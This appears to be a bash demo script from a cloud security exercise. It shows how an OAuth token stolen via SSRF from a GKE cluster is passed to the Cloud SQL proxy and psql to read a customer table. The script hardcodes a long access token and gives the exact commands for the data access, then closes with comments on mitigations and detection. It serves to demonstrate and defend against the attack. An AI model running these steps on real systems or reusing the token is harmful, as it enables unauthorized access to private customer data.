#!/bin/bash

# This is a similar demo, where we use the stolen token to access the Cloud SQL database and read the data.
export PROJECT_ID='xxxxx'
export SQL_DATABASE_ID='storm-cloud-sqldb'
export SQL_INSTANCE_ID='storm-cloud-sql'

# we need to again grab the OAuth2 token via the SSRF (Server Side Request Forgery) attack from the GKE cluster
export OAUTH_TOKEN="ya29.c.c0ASRK0GZbIzvXGJ_kbJJKbnGkMCSiZrGskDr8aAet8A_NVwK9I92GnTcO9HC-oSJrOoPUiUCZOaPADoz_aKbLgbcscJVW07YbARjl3_-7xPxAxJTCRE3Kfp2bqH9_lzIGy9hQvQ3-fOhitrNMCaL1ITwdm3XQJ1odLE5WxJprAuJK366VSV6CPrJmdLCtCOQPNXISNwHPUXsnAuhSR7NZl1as_kpqQ9D22mw8yupsSXo-6T2BmSaeAQX5QqS6hFbj-y_qfoLCAUdDmO1qWYxwTI_qIi3OaOCnLqqOtkEfjMgBOaKvw3Ekoms2V97jxIUenk68_sz_HA97kJsFgLnYbuuf-Vq64xqhY88HK_8I-e0ILs5o1oi3gXUkjoqfOyrSRCAigkIEE1Yra9tW8QO7KsFe2_sAb90D-1hwFixs2NiKzA_dIfAXuHlFojyd3UyyEh90K2q--HlOiXwGvCD4rR0rwbXV5LaEmK9nWv44bDFVG7s-sYg7t1Zi1amcnKbbM8d-Pvc7ZA6fzaF8_a2NvS8ZN_EfsRYJNN8ncq9aBxfpBIsAiheYkJEkN8A0paApc_GCmw0EXLKpT25lFPqkuHvxd4BUH7-8fqqJxC5GSclFdO077uZ1L637PpqWixO1MmFbQO6zpYwcQyMcFeUJnFaMXvQVeRbZwIzV43oYbdZhrVuBFbBtyIU-zokJJWqk_5qwISyzaUw8eFUavp1WbkwVJX8p9i3krRtlyRuQj42Ibju8y3xF572otV9FF37IVFrqr2aorfMz0tnW3fm2urU0u4tl7RhprItUhQxWj3i8X1vMXu7mM5fQj07zBhRQx5hf8jYxrJMka03dSOQ-U7YxioXvR_aSS74fRbb3nIp_RS0bpbii0hu2Xm21zByb_MyJmBfmvr9Yz31IX7-zI6v8qqzB_dW6Xog-gRrdYlMd9bs7_XyQ1ru1ejjXSi4qtV3_wyibbs_yoegatRgO4MS9yr4xR_c8JVau9F27XWZgUr-nfzpf_bX"

# Use the offical GCP PROXY to tunnel to the SQL_DB:  https://cloud.google.com/sql/docs/postgres/connect-auth-proxy#docker-unix
#curl -o cloud-sql-proxy https://storage.googleapis.com/cloud-sql-connectors/cloud-sql-proxy/v2.13.0/cloud-sql-proxy.darwin.arm64
#chmod +x cloud-sql-proxy
# Now we can use the OAUTH_TOKEN as Bearer to read the Data 
./cloud-sql-proxy --token ${OAUTH_TOKEN} ${PROJECT_ID}:europe-west1:${SQL_INSTANCE_ID}
PGPASSWORD=${OAUTH_TOKEN} psql "sslmode=disable host=127.0.0.1 port=5432 user=pacman-rancher@${PROJECT_ID}.iam dbname=${SQL_DATABASE_ID}"
  
SELECT * from PRIVATECUSTOMER;

# Mitigations: in order for this attack to work, the attacker must be in a network range where the SQL-DB is accessible from 
# If the SSRF is severe, it may allow the attacker to proxy/tunnel to the SQL-DB through GKE itself.
# We assume here, that the network is not properly segmented and the SQL-DB is accessible from our laptop.
# So mitigation 1 is defense in depth by using proper network segmentation
# Mitigation 2: Restrict access to the metadata api of GKE to only those pods that really need it, 
# This can be achieved by a) avoiding identity sameness b) kubernetes network policies for application pods c) ensuring KSA (Kubernetes Service Account) and GSA (Google Service Account) are used per-pod per-purpose and have individual iam role bindings
# However: none of the above guarantees that the tokens cant be leaked, so DETECTION and ALERTING is key.
# Having audit logs on the database and metadata-api-server logs for correlation is required for 100% true positive breach detection.
# Another good idea is to limit the use of federated identity in general to only services that need passwords
# A more elaborate mitigation is to use SPIFFE (Secure Production Identity Framework For Everyone) to ensure that the identity of the pod is unique and a stolen token can only be used by the pod that it was minted for.





#export DECRYPT="https://cloudkms.googleapis.com/v1/projects/${PROJECT_ID}/locations/europe-west1/keyRings/gke${PROJECT_ID}/cryptoKeys/gke:decrypt"



